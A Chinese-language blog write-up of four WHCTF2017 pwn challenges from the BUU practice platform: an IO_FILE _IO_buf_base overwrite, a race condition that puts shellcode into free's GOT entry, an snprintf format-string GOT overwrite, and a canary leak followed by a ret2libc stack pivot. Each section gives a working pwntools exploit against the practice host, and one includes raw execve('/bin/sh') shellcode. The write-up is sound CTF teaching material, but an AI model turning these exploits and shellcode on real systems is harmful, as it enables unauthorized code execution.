---
title: whctf2017 pwn题wp
tags: IO_FILE attack
categories: buu刷题
abbrlink: 1694f8f0
---

今天做题的时候无意做了一道buu上的whctf2017 stackoverflow,做完之后发现另外几道whctf2017的题目也很不错，就打算全做了都学习一下，题目全部在buu上都可以找到

## 总结

简单总结一下这四道题，它们分别考察了如下的知识点：

第一题考察了scanf函数最终的输入是在内部的`count = _IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);`这行代码，只要能控制这几个字段并且对其他一些字段进行绕过，就可以实现IO的任意地址写

第二题考察了条件竞争漏洞，在多线程的操作中访问同一个全局变量没有加锁，在delete函数中让全局指针被减到了位于got表的位置，从而malloc申请堆块的地址写入了got表里，没有开NX导致堆可执行，从而劫持got表跳转到堆的shellcode上

第三题考察的是snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。**snprintf拷贝字符的时候可能存在溢出**

第四题考察的是未初始化漏洞，在打印之前，没有对操作的指针进行初始化，从而使用了栈里的残留数据，泄露出了canary，配合gets的栈溢出漏洞，ret2libc获取shell

## whctf2017_stackoverflow

### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846592.png" alt="image-20221213084612401" style="zoom:50%;" />

### 漏洞所在

第一个漏洞点是往栈里输入数据之后没有0截断，并且使用了%s打印数据，从而可以泄露栈里存储的libc地址(如下)

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130846562.png" alt="image-20221213084641509" style="zoom:50%;" />

第二个漏洞是v2和size可以不一样，如果size大于0x300000的话，可以重新输入size(但是v2没有被更新)，而malloc函数申请大于128KB(0x20000 bit)的内存时会调用mmap在内存共享区映射出来一块内存，这片内存和libc里的地址存在固定偏移，我们提前控制一个v2的话就可以向任意一个libc地址写入一个0(如下)

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212130903387.png" alt="image-20221213090336309" style="zoom:50%;" />



### 利用思路

scanf的调用流程为scanf->vfscanf->\_\_uflow->_IO_default_uflow()->underflow->\_IO\_file\_underflow()

在最后的这个函数中有段代码调用了read  如下

`count = _IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);`

如果我们可以控制IO_buf_base，并且保证\_IO_buf_end - \_IO_buf_base不为0，就能实现地址任意写的目的。

不过需要绕过下面的检查，也就是要IO_read_ptr等于IO_read_end

```c
if (fp->_IO_read_ptr < fp->_IO_read_end) 
    return *(unsigned char *)fp->_IO_read_ptr;
```



我们的思路是向_IO_buf_base的地址里写入一个0，从而去再次控制\_IO_buf_base字段。如下

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131100968.png" alt="image-20221213110056374" style="zoom:50%;" />

此时的buf_base中的地址末尾已经被篡改为了00，所以下次可以向0x7f8d614a3900这个地址里写入(buf_end-buf_base)个字节的数据，该地址是\_IO_write_base字段，下次输入的话，我们控制buf_base为malloc_hook的地址，而buf_end至少要为malloc_hook-8（因为buf_end-buf_base就是下次往malloc_hook里写入的字节数）

![image-20221213110142157](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131101394.png)

篡改后的buf_base和buf_end如下，此时还无法往malloc_hook里写入数据，因为\_IO_read_ptr和\_IO_read_end并不相同。而当前函数被不断循环，其中IO_getc(stdin)函数可以刷新\_IO_read\_ptr，让其从输入缓冲区中读入一个字节的数据，并且让read_ptr指针加1，因此我们随便输入数据，触发getc函数39次就可以让read_ptr和read_end相同，从而往malloc_hook里写入one_gadget，在之后调用malloc函数的时候即可获取shell

![image-20221213110433209](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131104947.png)



### EXP

```py
from tools import *
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:25978")

p.sendafter("leave your name, bro:","a"*40)
libc_base=recv_libc()-0x7b947#-0x7b957#
log_addr('libc_base')
malloc_hook=libc_base+libc.symbols['__malloc_hook']

p.sendlineafter("please input the size to trigger stackoverflow: ",str(0x5c5908))
p.sendlineafter("please input the size to trigger stackoverflow: ",str(0x200000))

p.sendlineafter("padding and ropchain: ","b"*0x10)
debug(p,0x400A45,0x4008FF)
p.sendafter("please input the size to trigger stackoverflow: ",b's'*0x18+p64(malloc_hook)+p64(malloc_hook+0x8))
p.sendlineafter("padding and ropchain: ",p64(0xdeadbeef))
for i in range(39):
    p.sendlineafter("please input the size to trigger stackoverflow: ",'1')

p.sendlineafter("please input the size to trigger stackoverflow: ",p64(search_og(3)+libc_base))
p.interactive()

```

![image-20221213111146066](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131111298.png)



## whctf2017_note_sys

### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131657725.png" alt="image-20221213165703414" style="zoom:50%;" />

### 漏洞所在

本题是有一个add函数和delete函数，不过都是去创建了一个子进程来调用函数。

在两个函数中都涉及到了对同一个全局变量进行操作，在add函数中malloc申请堆块后将地址存入了202080指向的位置(这个位置是2020C0)，每次执行add函数的时候都会将202080指向的地址+8，也就是执行完当前函数再执行add函数，就是将malloc返回的地址写入2020c8里

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131659243.png" alt="image-20221213165948173" style="zoom:50%;" />

而执行delete函数则是每次执行完都让202080指向的地址-8(如下)，但需要注意的是先在202080指向的地址-8之后有一个usleep（这里会休眠两秒钟），而后再去执行下面的free函数部分

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131707847.png" alt="image-20221213170753777" style="zoom:50%;" />

### 利用思路

核心点是delete函数在子进程中被执行，并且父进程里没有pthread_join函数，这意味着我们可以趁着子进程执行delete函数的空隙，让父进程再次调用delete函数，让202080指向的地址2020c0不断去-8，减到got表的位置。再执行add函数，malloc申请一个堆块，向堆块里写入shellcode，此时malloc返回的地址被写入到了free的got表里，最终调用free函数的时候触发shellcode

正常情况下去free掉got地址会报错，但此处的条件竞争是在执行free函数前不断开启多个子进程对一个全局变量进行操作，**还没有执行到free函数崩溃前就已经把shellcode写到了free的got表里获取了shell**

循环22次也很好算 (0x2020c0-0x202018-8)/8=22   （这里不能直接写free的got地址，应该再减8字节，因为最后add的时候是先加了八字节）

### EXP

```py
from tools import *
p,e,libc=load("a","node4.buuoj.cn:28673")

for i in range(22):
    p.sendlineafter("choice:\n","2")

"""
xor rax,rax
push 0x3b
pop rax
xor rdi,rdi
mov rdi ,0x68732f2f6e69622f
xor rsi,rsi
push rsi
push rdi
push rsp
pop rdi
xor rdx,rdx
syscall
"""

shellcode=b"\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x48\x31\xF6\x56\x57\x54\x5F\x48\x31\xD2\x0F\x05"
debug(p,'pie',0xB66)
p.sendlineafter("choice:\n","0")
p.sendlineafter("input your note, no more than 250 characters\n",shellcode)

p.sendlineafter("choice:\n","2")
p.interactive()

```

![image-20221213172644320](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212131726043.png)



## whctf2017_easypwn

### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301822473.png" alt="image-20221230182239349" style="zoom:50%;" />

### 漏洞所在

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301823966.png" alt="image-20221230182343891" style="zoom:50%;" />

v3可被覆盖控制，而v3是format参数，可控就代表着存在格式化字符串漏洞。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301831494.png" alt="image-20221230183118429" style="zoom:50%;" />

snprintf会将s的数据拷贝0x7d0到v2上面，但是s和v2仅相离0x400，也就是说如果s写入0x400的话，拷贝到v2里面的时候就会溢出0x18个字节(v2和v3仅相距0x3e8个字节)从而控制v3，触发格式化字符串漏洞。

### 利用思路

relro保护开的是partial relro，这意味着可以篡改GOT表，而程序的此处莫名其妙的出现了一个free函数(如下)，并且free掉堆块的内容可控，很明显是想让我们劫持free的got表为system，然后堆块里面写入/bin/sh最后执行free获取shell

![image-20221230190529433](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301905510.png)



利用的时候有几个点需要注意一下：

1 就是格式化字符串利用的时候，发现0x3e8后不能直接触发漏洞，需要填充两个字符串才能利用(这里是试出来的，原因未知)

  ![image-20221230190941547](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301909592.png)

2 本题属于snprintf执行中的格式化字符串漏洞，snprintf是一个字符一个字符来处理的，可能是采取了一种循环遍历的方式，所以即使最初调用snprintf的时候format是%s，但后续的操作中format被改变了，然后再取格式化字符的时候触发了漏洞。

3 snprintf函数的format是在第三个参数的位置，所以算栈顶偏移的时候不是和以前加6，而是加4。

4 我这里是跑了三次循环，每次改写free函数的got表两个字节，三次下来就写了system的6字节地址。

5 这里写入数据的话，肯定是要减去前面发送的垃圾数据0x3e8个a,但是后面的0x16不知道咋来的，但这里也是可以试出来的，先减去0x3e8后，发现自己要写的值和实际写入的值差了0x16，那就在exp里多减0x16就能得到正确的值。

![image-20221230191633995](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301916047.png)

PS：exp不是一定能打通，因为如果libc地址的低位比较小的话，会导致payload后面没有对齐，不过这个概率不大，没打通的话多跑两次就行



### EXP

```py
from tools import *
context.arch='amd64'
context.log_level='debug'
p,e,libc=load("b","node4.buuoj.cn:27618")
p.sendlineafter("Input Your Code:\n",str(1))
debug(p,'pie',0xC05)
payload="a"*0x3e8+"b"*2+"%396$p%397$p"# libc addr 393+4
p.sendlineafter("Welcome To WHCTF2017:\n",payload)

p.recvuntil("397$p\n")
base_addr=int(p.recv(14),16)-0xda0
log_addr('base_addr')

libc_base=int(p.recv(14),16)-0x20830#0x20840
log_addr('libc_base')

value=(libc_base+libc.symbols['system'])
x=0
for i in range(3):
    log_info(hex(value%0x10000))
    payload=b"a"*0x3e8+b"bb%"+str(value%0x10000-0x3e8-0x16).encode()+b"c%133$hn"+p64(base_addr+e.got['free']+i*2)
    value=value>>16
    sleep(2)
    p.sendlineafter("Input Your Code:\n",str(1))
    p.sendlineafter("Welcome To WHCTF2017:\n",payload)

debug(p,'pie',0xD40)
p.sendlineafter("Input Your Code:\n",str(2))
p.sendlineafter("Input Your Name:\n","/bin/sh\x00")
p.interactive()
```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212301808658.png" alt="image-20221230180818030" style="zoom:50%;" />



## whctf2017_rc4

### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302213510.png" alt="image-20221230221340383" style="zoom:50%;" />

### 漏洞所在

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302214459.png" alt="image-20221230221432405" style="zoom: 50%;" />

这里存在了一个无法触发的格式化字符串漏洞，因为v1取的是一个字节的数据，但是rand生成的随机数是四字节的，无论如何也无法通过这个If检查触发格式化字符串漏洞



<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302216225.png" alt="image-20221230221652145" style="zoom:50%;" />

这里存在一个未初始化漏洞，如果进入这个函数不选择a b或者c的话，那么会跳转到LABEL_12的地方，而v2这个位置则是一个canary(这里我是先看roderick师傅写的wp，说可以利用这里泄露出来canary，然后调试了一下发现确实如此，如果单纯看代码的话确实无法发现这里是一个canary)

这个canary又被放到了*0x6020D8的位置，而后有个打印函数将0x6020D0开始16个字节进行了泄露，由此得到了canary

下图展示的代码部分还存在一个明显的栈溢出漏洞

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212302222846.png" alt="image-20221230222229763" style="zoom:50%;" />

### 利用思路

先泄露canary，然后利用栈溢出打ret2libc，我这里选择返回的是bss段上，进行了一个栈迁移，最后迁移过去的执行流是调用了execve(“/bin/sh\x00”,0,0) 当时用system发现没打通，索性就换成execve系统调用了

### EXP

```py
from tools import *
context.arch='amd64'
context.log_level='debug'
p,e,libc=load("a","node4.buuoj.cn:26330")
pop_rdi=0x0000000000401283
bss_addr=0x6020D8
leave_ret=0x401218
p.sendlineafter("> ","a")
p.sendlineafter("> ","b")


p.sendlineafter("> ","a")
p.sendlineafter("> ","u")

p.recv(16)
canary=int(p.recv(16),16)
log_addr('canary')


debug(p,0x401219)
p.sendlineafter("> ","b")
payload=b"a"*0x108+p64(canary)[::-1]+p64(bss_addr-8)
payload+=p64(pop_rdi)+p64(e.got['puts'])+p64(e.plt['puts'])
payload+=p64(pop_rdi)+p64(bss_addr)+p64(e.plt['gets'])+p64(leave_ret)
p.sendline(payload)
p.sendlineafter("> ","d")
p.sendlineafter("> ","d")
#pause()
sleep(0.3)
puts_addr=recv_libc()
sys_addr,bin_sh_addr=local_search("puts",puts_addr,libc)
pop_rdx=0x0000000000001b92+(puts_addr-libc.symbols['puts'])
pop_rsi=0x00000000000202e8+(puts_addr-libc.symbols['puts'])
execve=0x00000000000cc770+(puts_addr-libc.symbols['puts'])

payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(execve)
p.sendline(payload)
p.interactive()
```

## 参考文章

[(whctf2017_stackoverflow ha1vk的博客-CSDN博客_whctf2017stackoverflow](https://blog.csdn.net/seaaseesa/article/details/106694651)

[IO FILE 之任意读写 « 平凡路上 (ray-cp.github.io)](https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write#任意写)

[WHCTF 2017 note_sys | giantbranch's blog](https://www.giantbranch.cn/2017/12/11/WHCTF 2017 note_sys/)

[(44条消息) 攻防世界PWN之EasyPwn题解_ha1vk的博客-CSDN博客_pwn-sai_easy 解题思路](https://blog.csdn.net/seaaseesa/article/details/103089382)

[BUUCTF-pwn合集 - Lynne's House (roderickchan.github.io)](https://roderickchan.github.io/2022/04/15/BUUCTF-pwn-tasks-20/#whctf2017-rc4)